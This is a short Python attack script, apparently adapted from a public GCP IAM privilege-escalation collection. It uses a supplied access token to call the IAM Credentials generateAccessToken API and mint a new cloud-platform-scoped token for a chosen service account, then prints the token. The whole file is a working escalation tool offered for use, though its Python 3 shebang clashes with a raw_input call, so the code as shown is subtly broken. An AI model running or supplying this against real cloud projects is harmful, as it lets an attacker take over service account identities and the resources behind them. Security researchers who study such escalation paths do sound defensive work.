#!/usr/bin/python3

import requests
import json

from argparse import ArgumentParser

from apiclient.discovery import build
import google.oauth2.credentials

sBanner = """

 ######    ######  ########    
##    ##  ##    ## ##     ##     
##        ##       ##     ##      
##   #### ##       ########      
##    ##  ##       ##           
##    ##  ##    ## ##            
 ######    ######  ##            

iam_serviceAccounts_getAccessToken.py

"""

# Ref: https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getAccessToken.py

sUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"

print(sBanner)

# --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- #

# Get the Arguments
parser = ArgumentParser(add_help=True)

parser.add_argument('service_account', 
                    action="store",
                    help="[required] e.g.: 919372049334-compute@developer.gserviceaccount.com")
parser.add_argument('access_token', 
                    action="store",
                    help="[required] e.g.: ya29.c.KmnVB1Q119UvX1g-cv4mXtPKDnnMGkzHSTpiyZWbj-z7nlPc4l6Lg0PiWVWzj4CKhrBvqRNUApSATsvkZ9naCxXJuqA5MBg2a2KpMUXmF0asiFzYJRshg9joJhIAEHMQlLhQyDaqQAUX66Y")

args = parser.parse_args()

# --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- #


sServiceAccountName = str(args.service_account).strip()
sAccessToken = str(args.access_token).strip()

print("[+] sServiceAccountName: " + str(sServiceAccountName) + "")
print("[+] sAccessToken: " + str(sAccessToken) + "")

# --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- #

sEnter = raw_input("Press the [Enter] key to continue... ")

credentials = google.oauth2.credentials.Credentials(sAccessToken)
service = build(serviceName='iamcredentials', version='v1', credentials=credentials)

dBody = {
    'scope': [
        'https://www.googleapis.com/auth/iam',
        'https://www.googleapis.com/auth/cloud-platform'
    ]
}

sName = 'projects/-/serviceAccounts/'+sServiceAccountName
res = service.projects().serviceAccounts().generateAccessToken(name=sName, body=dBody).execute()

print(json.dumps(res, indent=4))